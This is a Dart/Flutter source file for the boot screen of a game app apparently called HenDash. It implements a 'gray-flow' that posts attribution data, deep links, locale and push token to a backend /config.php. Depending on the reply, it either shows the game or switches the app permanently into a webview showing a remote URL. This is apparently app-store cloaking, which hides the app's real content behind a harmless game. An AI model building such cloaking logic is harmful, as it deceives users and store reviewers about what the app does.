import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../data/run_mode.dart';
import '../net/attribution_hub.dart';
import '../net/backend_gate.dart';
import '../net/net_sensor.dart';
import '../net/push_courier.dart';
import '../vault/prefs_vault.dart';
import '../screens/menu_screen.dart';
import 'offline_notice_page.dart';
import 'push_invite_page.dart';
import 'portal_stage.dart' deferred as portal;

// ============================================================
// BootStage — first screen the user sees; decides gray/white.
// ============================================================
// The visual side keeps the HenDash yellow loading art (loading_vert.png
// / loading_hor.png) with the horizontal progress bar the user already
// approved.  The behavioural side runs the gray-flow state machine:
//
//   RunMode.fresh
//     · If we're offline → OfflineNoticePage.
//     · Ignite AttributionHub, wait for attribution + deep-link, POST
//       to /config.php.
//     · ok+url  → RunMode.webview → PushInvitePage (or PortalStage).
//     · otherwise → RunMode.game → MenuScreen.
//
//   RunMode.webview
//     · Push URL in the vault takes precedence — open PortalStage.
//     · Otherwise ignite AttributionHub, refresh, then PortalStage.
//     · Fall back to saved URL on network failure.
//
//   RunMode.game
//     · Skip the whole gray-flow.  Straight into MenuScreen.
//
// The loading UI is intentionally a *progress bar* (not a video) so
// this build renders identically on devices that can't decode webm/mp4.
// ============================================================

class BootStage extends StatefulWidget {
  const BootStage({
    super.key,
    required this.vault,
    required this.netSensor,
    required this.attributionHub,
    required this.backendGate,
    required this.pushCourier,
  });

  final PrefsVault vault;
  final NetSensor netSensor;
  final AttributionHub attributionHub;
  final BackendGate backendGate;
  final PushCourier pushCourier;

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage> with TickerProviderStateMixin {
  late final AnimationController _dotsCtrl;
  late final AnimationController _pulseCtrl;
  late final AnimationController _progressCtrl;
  Timer? _creepTimer;
  bool _handedOff = false;

  @override
  void initState() {
    super.initState();

    // Allow both orientations on the boot screen — the artwork ships in
    // vertical and horizontal variants.
    SystemChrome.setPreferredOrientations([
      DeviceOrientation.portraitUp,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);

    _dotsCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 900),
    )..repeat();
    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1400),
    )..repeat(reverse: true);
    _progressCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 700),
      value: 0.0,
    );

    // Kick off routing AFTER the first frame paints so the ribbon is
    // guaranteed to appear at 0 % before any animation starts.
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (mounted) _drive();
    });
  }

  // -------- Progress bar helpers ---------------------------------------
  //
  // The ribbon uses ONE continuous animation from 0 → ~92 % that runs in
  // parallel with the actual gray-flow work.  Whichever side finishes
  // first waits for the other, then a short final sweep finishes at
  // 100 % exactly at the moment we hand off to the next screen.
  //
  // No stage jumps → the user always sees the bar start at 0 and grow
  // smoothly to full.  A slow "creep" fallback still ticks the bar
  // upward during extra-long backend calls so it never freezes visibly.

  static const double _ambientTarget = 0.92;
  static const Duration _ambientDuration = Duration(milliseconds: 2600);

  Future<void> _startAmbientSweep() {
    return _progressCtrl.animateTo(
      _ambientTarget,
      duration: _ambientDuration,
      curve: Curves.linear,
    );
  }

  void _startCreep() {
    _creepTimer?.cancel();
    _creepTimer = Timer.periodic(const Duration(milliseconds: 220), (_) {
      if (!mounted) return;
      if (_progressCtrl.isAnimating) return;
      // Only wake up when the ambient sweep is complete but the work is
      // still running.  Advance by 0.3 % every 220 ms toward the ambient
      // ceiling — very gentle, keeps the ribbon "alive".
      if (_progressCtrl.value >= _ambientTarget) return;
      _progressCtrl.value =
          (_progressCtrl.value + 0.003).clamp(0.0, _ambientTarget);
    });
  }

  Future<void> _finishProgress() async {
    _creepTimer?.cancel();
    if (_progressCtrl.value >= 0.999) return;
    await _progressCtrl.animateTo(
      1.0,
      duration: const Duration(milliseconds: 550),
      curve: Curves.easeOutCubic,
    );
    await Future<void>.delayed(const Duration(milliseconds: 180));
  }

  // -------- Driver ------------------------------------------------------

  Future<void> _drive() async {
    // Kick off the visible sweep in parallel; do NOT await it.
    final ambient = _startAmbientSweep();
    _startCreep();

    // Also wire push + token callback right away.
    widget.pushCourier.onTokenRotated = _onTokenRotated;

    _Handoff plan;
    try {
      plan = await _computeHandoffPlan();
    } catch (_) {
      plan = const _Handoff(_Destination.game);
    }

    // Wait for the ambient sweep to reach a comfortable point (≥ 85%)
    // before starting the final push to 100 — avoids a visible jerk if
    // work finished super fast.
    while (mounted && _progressCtrl.value < 0.85) {
      // Short polling window; ambient will land inside this timeframe.
      await Future<void>.delayed(const Duration(milliseconds: 60));
    }
    // Also await the ambient itself in case backend was slow and the
    // linear sweep already finished — this future completes instantly.
    await ambient;
    if (!mounted) return;

    await _finishProgress();
    if (!mounted) return;

    switch (plan.dest) {
      case _Destination.portal:
        await _handOffToPortal(plan.url!);
        break;
      case _Destination.game:
        _handOffToGame();
        break;
      case _Destination.offline:
        _handOffOffline();
        break;
    }
  }

  Future<_Handoff> _computeHandoffPlan() async {
    await widget.pushCourier.wire().catchError((_) {});

    switch (widget.vault.mode) {
      case RunMode.game:
        // Game-only users never see PushInvitePage, so request the OS
        // notification permission proactively — otherwise Android 13+
        // silently drops every subsequent push.
        await _ensurePushPermissionSilently();
        return const _Handoff(_Destination.game);

      case RunMode.webview:
        return _planReturningOnline();

      case RunMode.fresh:
        return _planFirstLaunch();
    }
  }

  Future<void> _ensurePushPermissionSilently() async {
    if (widget.vault.pushGranted) return;
    if (widget.vault.pushOsBlocked) return;
    try {
      await widget.pushCourier.askPermission();
    } catch (_) {}
  }

  Future<_Handoff> _planFirstLaunch() async {
    final online = await widget.netSensor.isOnline();
    if (!online) return const _Handoff(_Destination.offline);

    await widget.attributionHub.ignite();
    await Future.wait([
      widget.attributionHub.awaitAttribution(),
      widget.attributionHub.awaitDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attributionHub.assembleBody(
      locale: locale,
      pushToken: widget.pushCourier.token,
    );
    final reply = await widget.backendGate.negotiate(body);

    if (reply.ok && reply.hasUrl) {
      await widget.vault.setMode(RunMode.webview);
      return _Handoff(_Destination.portal, url: reply.url);
    }
    await widget.vault.setMode(RunMode.game);
    await _ensurePushPermissionSilently();
    return const _Handoff(_Destination.game);
  }

  Future<_Handoff> _planReturningOnline() async {
    final pushUrl = await widget.vault.readAndClearPushUrl();
    if (pushUrl != null && pushUrl.isNotEmpty) {
      return _Handoff(_Destination.portal, url: pushUrl);
    }

    final online = await widget.netSensor.isOnline();
    if (!online) return const _Handoff(_Destination.offline);

    await widget.attributionHub.ignite();
    await Future.wait([
      widget.attributionHub
          .awaitAttribution(deadline: const Duration(seconds: 10)),
      widget.attributionHub.awaitDeepLink(),
    ]);

    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.attributionHub.assembleBody(
      locale: locale,
      pushToken: widget.pushCourier.token,
    );
    final reply = await widget.backendGate.negotiate(body);

    if (reply.ok && reply.hasUrl) {
      return _Handoff(_Destination.portal, url: reply.url);
    }
    final cached = await widget.backendGate.cachedUrl();
    if (cached != null && cached.isNotEmpty) {
      return _Handoff(_Destination.portal, url: cached);
    }
    return const _Handoff(_Destination.offline);
  }

  Future<void> _onTokenRotated(String newToken) async {
    // Re-negotiate the backend so the freshly minted token reaches it.
    try {
      final locale = Platform.localeName.replaceAll('-', '_');
      final body = await widget.attributionHub.assembleBody(
        locale: locale,
        pushToken: newToken,
      );
      await widget.backendGate.negotiate(body);
    } catch (_) {}
  }

  // -------- Handoffs ----------------------------------------------------

  void _handOffToGame() {
    if (_handedOff || !mounted) return;
    _handedOff = true;
    Navigator.of(context).pushReplacement(
      PageRouteBuilder<void>(
        transitionDuration: const Duration(milliseconds: 350),
        pageBuilder: (_, _, _) => const MenuScreen(),
        transitionsBuilder: (_, anim, _, child) =>
            FadeTransition(opacity: anim, child: child),
      ),
    );
  }

  Future<void> _handOffToPortal(String url) async {
    if (_handedOff || !mounted) return;
    _handedOff = true;
    await portal.loadLibrary();
    await portal.primePortalEngine();
    if (!mounted) return;

    if (widget.vault.shouldOfferPush()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => PushInvitePage(
            vault: widget.vault,
            courier: widget.pushCourier,
            netSensor: widget.netSensor,
            contentUrl: url,
          ),
        ),
      );
    } else {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => portal.PortalStage(
            initialUrl: url,
            vault: widget.vault,
            courier: widget.pushCourier,
            netSensor: widget.netSensor,
          ),
        ),
      );
    }
  }

  void _handOffOffline() {
    if (_handedOff || !mounted) return;
    _handedOff = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (_) => OfflineNoticePage(
          retryBuilder: (_) => BootStage(
            vault: widget.vault,
            netSensor: widget.netSensor,
            attributionHub: widget.attributionHub,
            backendGate: widget.backendGate,
            pushCourier: widget.pushCourier,
          ),
        ),
      ),
    );
  }

  // -------- Lifecycle ---------------------------------------------------

  @override
  void dispose() {
    _creepTimer?.cancel();
    _progressCtrl.dispose();
    _dotsCtrl.dispose();
    _pulseCtrl.dispose();
    widget.pushCourier.onTokenRotated = null;
    super.dispose();
  }

  // -------- Rendering ---------------------------------------------------

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      // Matches the top-of-sky pixel of the loading art so there is no
      // colour flash between the native launch backdrop and the moment
      // Flutter finishes decoding loading_vert.png / loading_hor.png.
      backgroundColor: const Color(0xFF0180E9),
      body: LayoutBuilder(
        builder: (context, constraints) {
          final isPortrait = constraints.maxHeight >= constraints.maxWidth;
          final backdrop = isPortrait
              ? 'assets/loading_vert.png'
              : 'assets/loading_hor.png';
          return Stack(
            fit: StackFit.expand,
            children: [
              Image.asset(
                backdrop,
                fit: BoxFit.cover,
                width: constraints.maxWidth,
                height: constraints.maxHeight,
              ),
              Positioned(
                left: 0,
                right: 0,
                bottom: constraints.maxHeight * 0.08,
                child: AnimatedBuilder(
                  animation: _progressCtrl,
                  builder: (_, _) {
                    final progress = _progressCtrl.value;
                    return Column(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        _AnimatedDots(
                          controller: _dotsCtrl,
                          percent: (progress * 100).round(),
                        ),
                        const SizedBox(height: 16),
                        Padding(
                          padding: EdgeInsets.symmetric(
                            horizontal: constraints.maxWidth * 0.12,
                          ),
                          child: _RibbonProgress(
                            progress: progress,
                            pulse: _pulseCtrl,
                          ),
                        ),
                      ],
                    );
                  },
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}

class _AnimatedDots extends StatelessWidget {
  const _AnimatedDots({required this.controller, required this.percent});
  final AnimationController controller;
  final int percent;

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, _) {
        final phase = (controller.value * 4).floor() % 4;
        final dots = '.' * phase;
        // Two-line label: "Loading..." above the live percentage.  The
        // percent number always mirrors the ribbon fill so the user
        // sees the exact same value the bar draws.
        return Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Text(
              'Loading$dots',
              style: const TextStyle(
                fontSize: 24,
                fontWeight: FontWeight.w800,
                color: Colors.white,
                letterSpacing: 1.4,
                shadows: [
                  Shadow(
                    color: Color(0xAA5B3A00),
                    offset: Offset(0, 2),
                    blurRadius: 4,
                  ),
                ],
              ),
            ),
            const SizedBox(height: 4),
            Text(
              '$percent %',
              style: const TextStyle(
                fontSize: 20,
                fontWeight: FontWeight.w700,
                color: Color(0xFFFFF3D2),
                letterSpacing: 1.0,
                shadows: [
                  Shadow(
                    color: Color(0xAA5B3A00),
                    offset: Offset(0, 2),
                    blurRadius: 4,
                  ),
                ],
              ),
            ),
          ],
        );
      },
    );
  }
}

class _RibbonProgress extends StatelessWidget {
  const _RibbonProgress({required this.progress, required this.pulse});
  final double progress;
  final AnimationController pulse;

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: pulse,
      builder: (_, _) {
        final glow = 0.35 + pulse.value * 0.35;
        return Container(
          height: 24,
          decoration: BoxDecoration(
            color: const Color(0xFF3B2100),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: Colors.white, width: 3),
            boxShadow: [
              BoxShadow(
                color: const Color(0xFFFF9900).withValues(alpha: glow),
                blurRadius: 12,
                offset: const Offset(0, 4),
              ),
              const BoxShadow(
                color: Color(0x66000000),
                blurRadius: 6,
                offset: Offset(0, 3),
              ),
            ],
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(10),
            child: Align(
              alignment: Alignment.centerLeft,
              // heightFactor: 1.0 forces the fill to stretch the full
              // ribbon height — without it DecoratedBox has no child
              // and collapses to zero px, so nothing paints even at
              // 92 % progress.
              child: FractionallySizedBox(
                widthFactor: progress.clamp(0.0, 1.0),
                heightFactor: 1.0,
                child: const DecoratedBox(
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        Color(0xFFFFF3A0),
                        Color(0xFFFFC844),
                        Color(0xFFFF8A00),
                      ],
                      begin: Alignment.topCenter,
                      end: Alignment.bottomCenter,
                    ),
                    boxShadow: [
                      BoxShadow(
                        color: Color(0x66FF9900),
                        blurRadius: 6,
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ),
        );
      },
    );
  }
}

// -------- Handoff plan value type ------------------------------------
// Small marker used by BootStage._computeHandoffPlan so the routing
// logic can decide the next screen without touching the progress bar.
// Keeping this at file scope avoids leaking implementation detail to
// callers.
enum _Destination { portal, game, offline }

class _Handoff {
  const _Handoff(this.dest, {this.url});
  final _Destination dest;
  final String? url;
}
